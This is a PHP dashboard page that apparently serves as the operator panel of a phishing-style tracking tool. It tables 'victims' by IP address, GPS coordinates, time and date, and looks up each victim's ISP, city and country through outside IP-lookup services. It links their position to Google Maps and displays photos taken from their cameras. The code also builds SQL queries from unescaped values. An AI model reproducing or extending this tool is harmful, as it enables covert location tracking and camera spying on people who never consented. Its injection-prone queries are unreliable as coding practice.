<?php 
include'navbar.php';
include'configue.php';
?>
<!DOCTYPE html>
<html>
<head>
	<title>Dashboard</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  <style>
  
  img{
    width: 400px;
  }
  </style>
</head>
<body>
<div class="container mt-5 mb-5">
<h4 class="mb-3"><i style="font-size:24px" class="fa">&#xf0c0;</i> Data Victim Lokasi</h4>
    <div class="table-responsive">
         <table class="table " style="">
     
        <tr class="bg-dark text-light">
          <th>No</th>
          <th>ID</th>
          <th>IP</th>
          <th>Location</th>
          <th>Jam</th>
          <th>Tanggal</th>
          <th>Detail</th>
        </tr>
     
      <?php
      //menampilkan semua data mahasiswa 
      $sql = mysqli_query($koneksi, "SELECT * FROM locat ORDER BY id DESC ");
      $x = 1;
      $hitung = mysqli_num_rows($sql);
      if($hitung == 0){
            ?>
            <tr>
            <td colspan="4" >No Data Available!</td>
            </tr>
            <?php
      }
      while($data = mysqli_fetch_array($sql)){
      ?>
        <tr>
          <td><?php echo $x;?></td>
          <td><?php echo ucwords($data['ids']);?></td>
          <td><?php echo ucwords($data['ip']);?></td>
          <td><?php echo $data['latlang'];?></td>
          <td><?php echo ucwords( $data['jam']);?></td>
          <td><?php echo ucwords( $data['tgl']);?></td>
          <!-- TOMBOL CETAK /PRINT DATA HISTORI MENGHUBUNGI MAHASISWA  -->
          <td>
          <!-- Button trigger modal -->
          <button type="button" class="btn btn-secondary" data-toggle="modal" data-target="#e<?php echo ucwords($data['ids']);?>">
            Lihat
          </button>

          <!-- Modal -->
          <div class="modal fade" id="e<?php echo ucwords($data['ids']);?>" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
              <div class="modal-content">
                <div class="modal-header">
                  <h5 class="modal-title" id="exampleModalLabel">Detail Informasi</h5>
                  <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                  </button>
                </div>
                <div class="modal-body">
                  <?php
                  $id = $data['id'];
                  $detail = mysqli_query($koneksi, "SELECT * FROM locat WHERE id='$id'");
                  $fetch = mysqli_fetch_array($detail);
                  $ch = curl_init();
                  curl_setopt($ch,CURLOPT_URL,"http://ipinfo.io/".$fetch['ip']);
                  curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                  $output=curl_exec($ch);
                  curl_close($ch);
                  $details = json_decode($output);
                  $ips = $details->ip;
                                        $ch = curl_init();
                                        $linko = "http://free.ipwhois.io/json/".$ips;
                                        curl_setopt($ch,CURLOPT_URL,"$linko");
                                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                                        $encode=curl_exec($ch);
                                        curl_close($ch);
                                      $decode = json_decode($encode);
                                      //var_dump($encode);
                                          $continent = $decode->continent;
                                          $phonecode = $decode->country_phone;
                                          $region = $decode->region; 
                                          $isp = $decode->isp;
                                          $city = $details->city;
                                          $countrycode = $details->country; 
                                          $curencycode = $decode->currency_code;
                                          $curencysymbol = $decode->currency_symbol;
                                          $country = $decode->country;
                                          $org = $decode->org; 
                                          $location = $fetch['latlang'];
                                          $timezone = $details->timezone;
                                          $timezonename = $decode->timezone_name;
                                          $curency = $decode->currency;
                                          $type = $decode->type;
                                                ?>
                                              <table class="table">
                                            <tr>
                                                <th colspan="2" class="bg-light"> IP</th>
                                            </tr>
                                            <tr>
                                                <th colspan="2"><?php echo $fetch['ip'];?></th>
                                            </tr>
                                            <tr>
                                                <td>Type</td>
                                                <td><?php echo $type;?></td>
                                            </tr>
                                            <tr>
                                                <td>Org</td>
                                                <td><?php echo $org;?></td>
                                            </tr>
                                            <tr>
                                                <td>Isp</td>
                                                <td><?php echo $isp;?></td>
                                            </tr>
                                            <tr>
                                                <td>Continent</td>
                                                <td><?php echo $continent;?></td>
                                            </tr>
                                            <tr>
                                                <td>Country Code</td>
                                                <td><?php echo $countrycode;?></td>
                                            </tr>
                                            <tr>
                                                <td>City</td>
                                                <td><?php echo $city;?></td>
                                            </tr>
                                            <tr>
                                                <td>Phone Code</td>
                                                <td><?php echo $phonecode;?></td>
                                            </tr>
                                            <tr>
                                                <td>Currency</td>
                                                <td><?php echo $curency;?></td>
                                            </tr>
                                            <tr>
                                                <td>Currency Code</td>
                                                <td><?php echo $curencycode;?></td>
                                            </tr>
                                            <tr>
                                                <td>Currency Symbol</td>
                                                <td><?php echo $curencysymbol;?></td>
                                            </tr>
                                            <tr>
                                                <td>Timezone</td>
                                                <td><?php echo $timezone;?></td>
                                            </tr>
                                            <tr>
                                                <td>Location 95% Akuration</td>
                                                <td><?php echo $location;?></td>
                                            </tr>
                                            <tr>
                                                <td colspan="2">
                                                <a href="<?php echo "http://maps.google.com/maps?q=".$location."&ll=".$location."&z=17"?>" target="_BLANK" class="btn btn-secondary">Map Link</a>
                                                </td>
                                            </tr>
                                        </table>

                </div>
                <div class="modal-footer">

                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
                </div>
              </div>
            </div>
          </div>
          
          </td>
        </tr>
      <?php $x++;} ?>
    </table>
        
    </div>
   
    <br>
    
    <h4 class="mb-3"><i style="font-size:24px" class="fa">&#xf0c0;</i> Data Victim Cam</h4>
    <div class="table-responsive">
        <table class="table " >
     
        <tr class="bg-dark text-light">
          <th>No</th>
          <th>ID</th>
          <th>Jam</th>
          <th>Tanggal</th>
          <th>Detail</th>
        </tr>
     
      <?php
      $author = $_SESSION['username'];
      //menampilkan semua data mahasiswa 
      $sql = mysqli_query($koneksi, "SELECT * FROM camera WHERE author='$author' ORDER BY id DESC ");
      $x = 1;
      $hitung = mysqli_num_rows($sql);
      if($hitung == 0){
            ?>
            <tr>
            <td colspan="4" >No Data Available!</td>
            </tr>
            <?php
      }
      while($data = mysqli_fetch_array($sql)){
      ?>
        <tr>
          <td><?php echo $x;?></td>
          <td><?php echo ucwords($data['ids']);?></td>
          <td><?php echo ucwords( $data['jam']);?></td>
          <td><?php echo ucwords( $data['tgl']);?></td>
          <!-- TOMBOL CETAK /PRINT DATA HISTORI MENGHUBUNGI MAHASISWA  -->
          <td>
          <!-- Button trigger modal -->
          <button type="button" class="btn btn-secondary" data-toggle="modal" data-target="#<?php echo ucwords($data['ids']);?>">
            Lihat
          </button>

          <!-- Modal -->
          <div class="modal fade" id="<?php echo ucwords($data['ids']);?>" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
              <div class="modal-content">
                <div class="modal-header">
                  <h5 class="modal-title" id="exampleModalLabel">Detail Informasi</h5>
                  <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                  </button>
                </div>
                <div class="modal-body">
                  <img src="<?php echo $data['linkpict']; ?>" style="width:100%;">
                </div>
                <div class="modal-footer">

                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
                </div>
              </div>
            </div>
          </div>
          
          </td>
        </tr>
      <?php $x++;} ?>
    </table>
        
    </div>
    

</div>

</body>
</html>